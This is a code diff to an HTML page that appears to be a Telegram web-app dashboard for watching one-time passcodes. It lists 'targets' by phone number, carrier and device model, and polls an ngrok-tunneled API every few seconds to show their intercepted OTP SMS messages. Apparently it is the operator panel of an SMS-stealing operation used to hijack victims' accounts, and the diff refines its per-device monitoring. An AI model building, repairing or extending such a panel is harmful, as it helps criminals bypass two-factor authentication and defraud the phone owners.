@@ -7,41 +7,52 @@
     <style>
         body { background:#0a0a0a; color:#e0e0e0; font-family:sans-serif; margin:0; padding:15px; }
         .tabs { display:flex; gap:5px; margin-bottom:10px; }
-        .tab { flex:1; padding:10px; background:#1e1e1e; text-align:center; border-radius:8px 8px 0 0; cursor:pointer; }
+        .tab { flex:1; padding:12px; background:#1e1e1e; text-align:center; border-radius:8px 8px 0 0; cursor:pointer; font-weight:bold; }
         .tab.active { background:#2ecc71; color:#000; }
         .panel { display:none; }
         .panel.active { display:block; }
 
-        .card { background:#1e1e1e; border-radius:10px; padding:12px; margin:8px 0; }
+        .card { background:#1e1e1e; border-radius:12px; padding:15px; margin:10px 0; transition:all 0.3s ease; }
+        .card.monitoring { border:1px solid #2ecc71; }
         .card-header { display:flex; justify-content:space-between; align-items:center; }
-        .monitor-box {
-            margin-top:10px;
-            padding:10px;
-            background:#2c3e50;
-            border-radius:8px;
+        .phone-info { flex:1; }
+        .phone-info b { font-size:18px; }
+        .phone-info small { color:#aaa; }
+
+        .monitor-btn { background:#2ecc71; color:#000; border:none; padding:10px 18px; border-radius:8px; font-weight:bold; cursor:pointer; font-size:14px; }
+        .monitor-btn.stop { background:#e74c3c; }
+        .fav-btn { background:#f39c12; color:#000; border:none; padding:8px; border-radius:6px; cursor:pointer; margin-right:5px; }
+
+        .monitor-view {
             display:none;
+            margin-top:15px;
+            background:#1a2634;
+            border-radius:10px;
+            padding:15px;
+            border:1px solid #2ecc71;
         }
-        .monitor-box.active { display:block; }
-        .target-heading {
-            font-size:18px; font-weight:bold; margin-bottom:5px;
-            display:flex; align-items:center; gap:10px;
+        .monitor-view.active { display:block; }
+        .target-header {
+            display:flex; align-items:center; gap:10px; margin-bottom:10px;
+            background:#0f1923; padding:10px; border-radius:8px;
         }
-        .copy-btn {
-            background:#3498db; color:#fff; border:none;
-            padding:4px 8px; border-radius:4px; cursor:pointer; font-size:12px;
+        .target-header span { font-size:20px; font-weight:bold; color:#2ecc71; }
+        .copy-btn { background:#3498db; color:#fff; border:none; padding:6px 12px; border-radius:6px; cursor:pointer; font-size:13px; }
+
+        .otp-log {
+            background:#0d1117; min-height:200px; max-height:400px;
+            overflow-y:auto; padding:12px; border-radius:8px; margin-bottom:10px;
         }
-        .otp-area {
-            background:#111; min-height:60px; max-height:200px;
-            overflow-y:auto; padding:8px; border-radius:6px; margin:8px 0;
+        .otp-entry {
+            background:#161b22; padding:10px; margin:8px 0; border-radius:6px;
+            border-left:4px solid #2ecc71; font-size:13px;
         }
-        .otp-line {
-            background:#1a1a1a; padding:6px 8px; margin:4px 0;
-            border-radius:4px; font-size:13px;
-        }
-        .btn { background:#2ecc71; color:#000; border:none; padding:8px 14px; border-radius:6px; font-weight:bold; cursor:pointer; }
-        .btn.stop { background:#e74c3c; }
-        .btn.close { background:#95a5a6; color:#000; margin-top:5px; }
-        .fav-btn { background:#f39c12; }
+        .otp-entry .time { color:#58a6ff; font-size:12px; }
+
+        .actions { display:flex; gap:10px; justify-content:flex-end; }
+        .btn-clear { background:#e67e22; color:#000; border:none; padding:8px 16px; border-radius:6px; cursor:pointer; font-weight:bold; }
+        .btn-close { background:#95a5a6; color:#000; border:none; padding:8px 16px; border-radius:6px; cursor:pointer; font-weight:bold; }
+
         #feed { height:350px; overflow-y:auto; background:#111; border-radius:8px; padding:8px; }
         input, button { font-size:14px; }
     </style>
@@ -54,11 +65,11 @@
     </div>
 
     <div id="targets-panel" class="panel active">
-        <input type="text" id="search" placeholder="Filter by phone..." oninput="filterTargets()">
+        <input type="text" id="search" placeholder="Filter by phone..." oninput="filterTargets()" style="width:100%;padding:10px;border-radius:6px;border:none;margin-bottom:10px;background:#2c3e50;color:#eee;">
         <div id="targets-list"></div>
     </div>
     <div id="favourites-panel" class="panel">
-        <button onclick="loadFavourites()">🔄 Refresh</button>
+        <button onclick="loadFavourites()" style="margin-bottom:10px;background:#2ecc71;color:#000;border:none;padding:10px;border-radius:6px;font-weight:bold;">🔄 Refresh</button>
         <div id="favourites-list"></div>
     </div>
     <div id="feed-panel" class="panel">
@@ -79,15 +90,10 @@
             throw new Error('No user ID');
         }
 
-        const HEADERS = {
-            'ngrok-skip-browser-warning': 'true',
-            'Content-Type': 'application/json'
-        };
+        const HEADERS = { 'ngrok-skip-browser-warning': 'true', 'Content-Type': 'application/json' };
         let allTargets = [];
-        // Active monitors per device: did -> { active:bool, phone:string, lastTs:number }
-        let activeMonitors = {};
-        let globalPollInterval = null;
-        let globalLastOtpTs = 0;
+        // Per‑device monitor state: did -> { active:bool, phone:string, startTime:number, lastOtpTs:number, intervalId:number, otpLog:array<string> }
+        let monitors = {};
 
         // Tab switching
         window.switchTab = (tab) => {
@@ -99,7 +105,7 @@
             if (tab === 'favourites') loadFavourites();
         };
 
-        // ----- Targets -----
+        // ========== TARGETS ==========
         async function loadTargets() {
             try {
                 let res = await fetch(`${API}/api/targets`, { headers: HEADERS });
@@ -118,35 +124,45 @@
                 html += `
                 <div class="card" id="card-${t.did}">
                     <div class="card-header">
-                        <div>
+                        <div class="phone-info">
                             <b>${t.phone1}</b>${carrier}<br>
                             <small>${t.model} | DB-${t.db_index}</small>
                         </div>
                         <div>
-                            <button class="btn fav-btn" onclick="toggleFavourite('${t.did}')">⭐</button>
-                            <button class="btn" id="monitor-btn-${t.did}" onclick="toggleMonitor('${t.did}', ${t.db_index}, '${t.phone1}', '${t.model}')">▶️ MONITOR</button>
+                            <button class="fav-btn" onclick="toggleFavourite('${t.did}')">⭐</button>
+                            <button class="monitor-btn" id="monitor-btn-${t.did}" onclick="toggleMonitor('${t.did}', ${t.db_index}, '${t.phone1}', '${t.model}')">▶️ MONITOR</button>
                         </div>
                     </div>
-                    <div class="monitor-box" id="monitor-box-${t.did}">
-                        <div class="target-heading">
-                            TARGET: ${t.phone1}
+                    <!-- Expandable Monitor View -->
+                    <div class="monitor-view" id="monitor-view-${t.did}">
+                        <div class="target-header">
+                            <span>🎯 TARGET: ${t.phone1}</span>
                             <button class="copy-btn" onclick="copyText('${t.phone1}')">📋 Copy</button>
                         </div>
-                        <div class="otp-area" id="otp-area-${t.did}"></div>
-                        <button class="btn close" onclick="closeMonitor('${t.did}')">✖ Close</button>
+                        <div class="otp-log" id="otp-log-${t.did}"></div>
+                        <div class="actions">
+                            <button class="btn-clear" onclick="clearOTPs('${t.did}')">🧹 Clear</button>
+                            <button class="monitor-btn stop" id="stop-btn-${t.did}" onclick="toggleMonitor('${t.did}')">⏹ STOP</button>
+                            <button class="btn-close" onclick="closeMonitor('${t.did}')">✖ Close</button>
+                        </div>
                     </div>
                 </div>`;
             });
             document.getElementById('targets-list').innerHTML = html;
-            // Restore any already active monitors
-            for (let did in activeMonitors) {
-                if (activeMonitors[did].active) {
-                    let box = document.getElementById('monitor-box-'+did);
+            // Restore any active monitors
+            for (let did in monitors) {
+                let monitor = monitors[did];
+                if (monitor.active) {
+                    let view = document.getElementById('monitor-view-'+did);
                     let btn = document.getElementById('monitor-btn-'+did);
-                    if (box && btn) {
-                        box.classList.add('active');
+                    let card = document.getElementById('card-'+did);
+                    if (view && btn && card) {
+                        view.classList.add('active');
+                        card.classList.add('monitoring');
                         btn.innerHTML = '⏹ STOP';
                         btn.classList.add('stop');
+                        // Re‑populate OTP log
+                        document.getElementById('otp-log-'+did).innerHTML = monitor.otpLog.join('');
                     }
                 }
             }
@@ -158,98 +174,142 @@
             renderTargets(filtered);
         };
 
-        // ----- Monitor Toggle -----
+        // ========== MONITOR TOGGLE ==========
         window.toggleMonitor = async function(did, dbIndex, phone, model) {
-            let monitor = activeMonitors[did];
-            let btn = document.getElementById('monitor-btn-'+did);
-            let box = document.getElementById('monitor-box-'+did);
-
-            if (!monitor || !monitor.active) {
-                // Start monitoring
-                await fetch(`${API}/api/monitor`, {
-                    method: 'POST', headers: HEADERS,
-                    body: JSON.stringify({ user_id: userId, did, db_index: dbIndex, phone1: phone, model })
-                });
-                activeMonitors[did] = { active: true, phone: phone, lastTs: 0 };
-                if (btn) {
-                    btn.innerHTML = '⏹ STOP';
-                    btn.classList.add('stop');
-                }
-                if (box) box.classList.add('active');
-                startGlobalPolling();
+            // If no monitor object, create and start
+            if (!monitors[did]) {
+                await startMonitoring(did, dbIndex, phone, model);
+                return;
+            }
+            let monitor = monitors[did];
+            if (!monitor.active) {
+                // Resume / restart monitoring
+                await startMonitoring(did, dbIndex, phone, model);
             } else {
-                // Stop monitoring
-                await fetch(`${API}/api/monitor`, {
-                    method: 'DELETE', headers: HEADERS,
-                    body: JSON.stringify({ user_id: userId, did })
-                });
-                activeMonitors[did].active = false;
-                if (btn) {
-                    btn.innerHTML = '▶️ MONITOR';
-                    btn.classList.remove('stop');
-                }
-                // Keep box open, just stop updating (user can close manually)
+                // Stop monitoring (keep view open)
+                await stopMonitoring(did, false);
             }
         };
 
-        // Close box completely
-        window.closeMonitor = async function(did) {
-            if (activeMonitors[did]?.active) {
-                await fetch(`${API}/api/monitor`, {
-                    method: 'DELETE', headers: HEADERS,
-                    body: JSON.stringify({ user_id: userId, did })
-                });
+        async function startMonitoring(did, dbIndex, phone, model) {
+            // Cancel existing if any
+            if (monitors[did]?.active) {
+                await stopMonitoring(did, true); // silent stop, keep UI
             }
-            delete activeMonitors[did];
-            let box = document.getElementById('monitor-box-'+did);
-            let btn = document.getElementById('monitor-btn-'+did);
-            if (box) box.classList.remove('active');
-            if (btn) {
-                btn.innerHTML = '▶️ MONITOR';
-                btn.classList.remove('stop');
-            }
-            document.getElementById('otp-area-'+did).innerHTML = '';
-        };
-
-        // ----- Global OTP Polling (runs when any monitor active) -----
-        function startGlobalPolling() {
-            if (globalPollInterval) return;
-            globalPollInterval = setInterval(async () => {
-                let activeIds = Object.keys(activeMonitors).filter(did => activeMonitors[did].active);
-                if (activeIds.length === 0) {
-                    clearInterval(globalPollInterval);
-                    globalPollInterval = null;
-                    return;
-                }
-                try {
-                    let res = await fetch(`${API}/api/otp/${userId}?since=${globalLastOtpTs}`, { headers: HEADERS });
-                    if (!res.ok) return;
-                    let msgs = await res.json();
-                    if (msgs.length) {
-                        globalLastOtpTs = msgs[msgs.length-1].ts;
-                        msgs.forEach(m => {
-                            // Match phone number in formatted SMS
-                            let match = m.text.match(/📟 \*\*SIM:\*\* `(\d+)`/);
-                            if (match) {
-                                let phone = match[1];
-                                for (let did in activeMonitors) {
-                                    if (activeMonitors[did].active && activeMonitors[did].phone === phone) {
-                                        let area = document.getElementById('otp-area-'+did);
-                                        if (area) {
-                                            area.innerHTML += `<div class="otp-line">${m.text}</div>`;
-                                            area.scrollTop = area.scrollHeight;
-                                        }
-                                        break;
-                                    }
-                                }
-                            }
-                        });
-                    }
-                } catch(e) {}
-            }, 3000);
+            let startTime = Date.now() / 1000;
+            await fetch(`${API}/api/monitor`, {
+                method: 'POST', headers: HEADERS,
+                body: JSON.stringify({ user_id: userId, did, db_index: dbIndex, phone1: phone, model })
+            });
+            monitors[did] = {
+                active: true,
+                phone: phone,
+                startTime: startTime,
+                lastOtpTs: startTime,
+                intervalId: null,
+                otpLog: []   // array of HTML strings
+            };
+            updateMonitorUI(did, true);
+            startDevicePolling(did);
         }
 
-        // ----- Favourites (simplified, keep existing) -----
+        async function stopMonitoring(did, keepView) {
+            if (!monitors[did]?.active) return;
+            await fetch(`${API}/api/monitor`, {
+                method: 'DELETE', headers: HEADERS,
+                body: JSON.stringify({ user_id: userId, did })
+            });
+            if (monitors[did].intervalId) {
+                clearInterval(monitors[did].intervalId);
+                monitors[did].intervalId = null;
+            }
+            monitors[did].active = false;
+            if (!keepView) {
+                updateMonitorUI(did, false);
+            } else {
+                // just update button state
+                let btn = document.getElementById('monitor-btn-'+did);
+                if (btn) { btn.innerHTML = '▶️ MONITOR'; btn.classList.remove('stop'); }
+            }
+        }
+
+        function updateMonitorUI(did, active) {
+            let btn = document.getElementById('monitor-btn-'+did);
+            let view = document.getElementById('monitor-view-'+did);
+            let card = document.getElementById('card-'+did);
+            if (active) {
+                if (btn) { btn.innerHTML = '⏹ STOP'; btn.classList.add('stop'); }
+                if (view) view.classList.add('active');
+                if (card) card.classList.add('monitoring');
+            } else {
+                if (btn) { btn.innerHTML = '▶️ MONITOR'; btn.classList.remove('stop'); }
+                // Keep view open so user can see past OTPs
+            }
+        }
+
+        function startDevicePolling(did) {
+            if (monitors[did]?.intervalId) return;
+            // Immediate first poll
+            pollDevice(did);
+            monitors[did].intervalId = setInterval(() => pollDevice(did), 3000);
+        }
+
+        async function pollDevice(did) {
+            let monitor = monitors[did];
+            if (!monitor || !monitor.active) return;
+            try {
+                let res = await fetch(`${API}/api/otp/${userId}?since=${monitor.lastOtpTs}`, { headers: HEADERS });
+                if (!res.ok) return;
+                let msgs = await res.json();
+                if (msgs.length) {
+                    let logDiv = document.getElementById('otp-log-'+did);
+                    msgs.forEach(m => {
+                        // Only show messages that arrived after monitoring started
+                        if (m.ts >= monitor.startTime) {
+                            let timeStr = new Date(m.ts * 1000).toLocaleTimeString();
+                            let displayText = m.text.replace(/\n/g, '<br>');
+                            let entry = `<div class="otp-entry"><span class="time">${timeStr}</span><br>${displayText}</div>`;
+                            monitor.otpLog.push(entry);
+                            if (logDiv) {
+                                logDiv.innerHTML += entry;
+                                logDiv.scrollTop = logDiv.scrollHeight;
+                            }
+                        }
+                        if (m.ts > monitor.lastOtpTs) monitor.lastOtpTs = m.ts;
+                    });
+                }
+            } catch(e) { console.error('Poll error:', e); }
+        }
+
+        // Close monitor view completely and stop
+        window.closeMonitor = async function(did) {
+            if (monitors[did]?.active) {
+                await fetch(`${API}/api/monitor`, {
+                    method: 'DELETE', headers: HEADERS,
+                    body: JSON.stringify({ user_id: userId, did })
+                });
+            }
+            if (monitors[did]?.intervalId) clearInterval(monitors[did].intervalId);
+            delete monitors[did];
+            let view = document.getElementById('monitor-view-'+did);
+            let btn = document.getElementById('monitor-btn-'+did);
+            let card = document.getElementById('card-'+did);
+            if (view) view.classList.remove('active');
+            if (btn) { btn.innerHTML = '▶️ MONITOR'; btn.classList.remove('stop'); }
+            if (card) card.classList.remove('monitoring');
+            document.getElementById('otp-log-'+did).innerHTML = '';
+        };
+
+        // Clear OTP log for a device
+        window.clearOTPs = function(did) {
+            if (monitors[did]) {
+                monitors[did].otpLog = [];
+            }
+            let logDiv = document.getElementById('otp-log-'+did);
+            if (logDiv) logDiv.innerHTML = '';
+        };
+
+        // ========== FAVOURITES ==========
         async function loadFavourites() {
             try {
                 let res = await fetch(`${API}/api/favourites/${userId}`, { headers: HEADERS });
@@ -260,10 +320,9 @@
                 else {
                     favs.forEach(f => {
                         html += `<div class="card">
-                            <div><b>${f.phone1}</b> (${f.carrier1})<br><small>${f.model} | DB-${f.db_index}</small></div>
-                            <div>
-                                <button class="btn" onclick="toggleMonitor('${f.did}', ${f.db_index}, '${f.phone1}', '${f.model}')">▶️ MONITOR</button>
-                                <button class="btn stop" onclick="removeFavourite('${f.did}')">🗑️</button>
+                            <div class="card-header">
+                                <div class="phone-info"><b>${f.phone1}</b> (${f.carrier1})<br><small>${f.model} | DB-${f.db_index}</small></div>
+                                <button class="monitor-btn" onclick="toggleMonitor('${f.did}', ${f.db_index}, '${f.phone1}', '${f.model}')">▶️ MONITOR</button>
                             </div>
                         </div>`;
                     });
@@ -290,7 +349,7 @@
             loadFavourites();
         };
 
-        // Copy helper
+        // ========== HELPERS ==========
         function copyText(text) {
             navigator.clipboard.writeText(text).then(() => tg.showAlert('Copied!'));
         }
